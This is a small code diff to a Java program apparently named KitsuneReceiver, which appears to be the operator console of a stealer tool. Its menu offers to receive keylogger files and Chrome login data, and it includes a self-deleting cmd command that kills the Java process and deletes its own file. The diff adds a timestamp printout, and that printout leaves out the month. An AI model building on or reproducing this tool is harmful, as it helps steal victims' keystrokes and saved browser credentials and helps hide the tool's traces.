@@ -1,5 +1,6 @@
 import java.io.*;
 import java.net.*;
+import java.util.Calendar;
 import java.util.Scanner;
 
 public class ashiatonikki
@@ -15,7 +16,7 @@ public class ashiatonikki
 				 Process bye = Runtime.getRuntime().exec("cmd /c start cmd.exe /K" + " " + "taskkill /im javaw.exe /f && del " + cf + " && taskkill /im cmd.exe /f");
 				 System.exit(0);
 		  }
-		  System.out.println("KitsuneReceiver v0.4.1 by Carb0n");
+		  System.out.println("KitsuneReceiver v0.4.2 by Carb0n");
 		  System.out.println("Enter the passcode");
 		  Scanner sc = new Scanner(System.in);
 		  String pwd = sc.nextLine();
@@ -27,6 +28,14 @@ public class ashiatonikki
 		  }
 	  }
 	  for(;;) {
+		  java.util.Date date = new java.util.Date();
+		  Calendar cal = Calendar.getInstance();
+		  cal.setTime(date);
+		  int month = cal.get(Calendar.MONTH) + 1;
+		  int dab = cal.get(Calendar.DATE);
+		  int hours = cal.get(Calendar.HOUR_OF_DAY);
+		  int minutes = cal.get(Calendar.MINUTE);
+		  System.out.println("The current date is " + dab + "-" + hours + ":" + minutes);
 		  System.out.println("Please input your command.");
 		  System.out.println("[1] Receive Keylogger Files");
 		  System.out.println("[2] Receive Chrome Login Data");
@@ -201,4 +210,3 @@ public class ashiatonikki
       	  }
         }
      }
-
